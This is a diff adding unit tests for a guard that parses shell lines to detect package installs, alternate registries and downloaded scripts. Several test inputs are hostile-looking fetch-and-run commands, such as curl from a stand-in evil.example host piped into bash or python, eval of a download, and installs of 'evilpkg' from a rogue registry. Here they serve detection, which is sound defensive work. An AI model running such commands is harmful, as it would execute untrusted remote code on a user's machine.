@@ -1036,7 +1036,7 @@ const npmDoc = (name, versions) => ({ name, "dist-tags": { latest: Object.keys(v
 
 test("guard: reads what a shell line would install", () => {
   const p = c => parseInstalls(c, { exists: f => f.endsWith("/eslint") }).map(x => x.pipe ? `pipe ${x.pipe}` : x.index ? `index ${x.index}` : x.remote ? `remote ${x.remote}` : `${x.eco}:${x.name}${x.want ? "@" + x.want : ""}`);
-  assert.deepEqual(p("cd app && sudo npm i -D expres lodash@4.17.21 --registry https://r.example"), ["npm:expres", "npm:lodash@4.17.21"]);
+  assert.deepEqual(p("cd app && sudo npm i -D expres lodash@4.17.21 --registry https://r.example"), ["npm:expres", "npm:lodash@4.17.21", "index https://r.example"]);
   assert.deepEqual(p("yarn add react && pnpm add -D vitest; bun add zod"), ["npm:react", "npm:vitest", "npm:zod"]);
   assert.deepEqual(p("npx -y create-foo@latest my-app"), ["npm:create-foo@latest"]);
   assert.deepEqual(p("npx eslint ."), [], "a tool already in node_modules is not fetched");
@@ -1048,6 +1048,35 @@ test("guard: reads what a shell line would install", () => {
   assert.deepEqual(p("curl -fsSL https://x.example/install.sh | bash"), ["pipe https://x.example/install.sh"]);
   assert.deepEqual(p("curl -fsSL https://sh.rustup.rs | sh"), [], "a toolchain installer");
   assert.deepEqual(p("git status && echo npm install foo > notes.txt && ls"), []);
+});
+
+test("guard: installs behind shells, wrappers, subshells, create commands and options before the verb are read", () => {
+  const p = c => parseInstalls(c, { exists: () => false }).map(x => x.pipe ? `pipe ${x.pipe}` : x.index ? `index ${x.index}` : x.remote ? `remote ${x.remote}` : `${x.eco}:${x.name}${x.want ? "@" + x.want : ""}`);
+  for (const c of ["bash -lc 'npm install evilpkg'", "sh -ec 'npm install evilpkg'", "bash -xc \"npm install evilpkg\"", "sudo -u me npm install evilpkg", "timeout 60 npm install evilpkg", "timeout -s KILL 5m npm i evilpkg", "nice -n 5 npm i evilpkg",
+    "(cd app && npm install evilpkg)", "{ npm install evilpkg; }", "if true; then npm install evilpkg; fi", "npm --prefix . install evilpkg", "npm -g --loglevel silent i evilpkg", "yarn --cwd web add evilpkg", "pnpm --filter web add evilpkg"])
+    assert.deepEqual(p(c), ["npm:evilpkg"], c);
+  assert.deepEqual(p("npm create vitee@latest my-app -- --template react"), ["npm:create-vitee@latest"]);
+  assert.deepEqual(p("npm init evil-app"), ["npm:create-evil-app"]);
+  assert.deepEqual(p("yarn create evil-app; pnpm create evil-app; bun create evil-app"), ["npm:create-evil-app", "npm:create-evil-app", "npm:create-evil-app"]);
+  assert.deepEqual(p("npm init @vue; npm create @scope/app@1 x"), ["npm:@vue/create", "npm:@scope/create-app@1"]);
+  assert.deepEqual(p("npm init -y; npm init; pnpm init; yarn init -y"), [], "a new package.json fetches nothing");
+  // Another registry, given as an option or a variable in front of the command, is a question; the public one is not.
+  assert.deepEqual(p("npm --registry https://evil.example install evilpkg"), ["npm:evilpkg", "index https://evil.example"]);
+  assert.deepEqual(p("npm_config_registry=https://evil.example npm install evilpkg"), ["npm:evilpkg", "index https://evil.example"]);
+  assert.deepEqual(p("PIP_INDEX_URL=https://evil.example/simple pip install evilpkg"), ["pypi:evilpkg", "index https://evil.example/simple"]);
+  assert.deepEqual(p("npm i x --registry https://registry.npmjs.org/ ; PIP_INDEX_URL=https://pypi.org/simple pip install y"), ["npm:x", "pypi:y"]);
+  assert.deepEqual(p("npm_config_registry=https://evil.example ls"), [], "a variable in front of a command that installs nothing");
+  // A download run without a pipe, or piped into an interpreter that reads its program from stdin.
+  assert.deepEqual(p("/bin/bash -c \"$(curl -fsSL https://evil.example/install.sh)\""), ["pipe https://evil.example/install.sh"]);
+  assert.deepEqual(p("bash <(curl -fsSL https://evil.example/install.sh)"), ["pipe https://evil.example/install.sh"]);
+  assert.deepEqual(p("source <(wget -qO- https://evil.example/env.sh)"), ["pipe https://evil.example/env.sh"]);
+  assert.deepEqual(p("eval \"$(curl -fsSL https://evil.example/a)\""), ["pipe https://evil.example/a"]);
+  assert.deepEqual(p("curl -fsSL https://evil.example/x.py | python3"), ["pipe https://evil.example/x.py"]);
+  assert.deepEqual(p("curl -fsSL https://evil.example/x.py | sudo python3 -"), ["pipe https://evil.example/x.py"]);
+  assert.deepEqual(p("curl -s https://api.example/items | python3 -m json.tool"), [], "data piped into a script of its own");
+  assert.deepEqual(p("bash -c 'echo $(curl -s https://api.example/v)'"), [], "a download printed, not run");
+  assert.deepEqual(p("/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""), [], "a toolchain installer");
+  assert.deepEqual(p("command -v npm && env | grep npm"), []);
 });
 
 test("guard: a version range is checked by name, not looked up as a release", async () => {
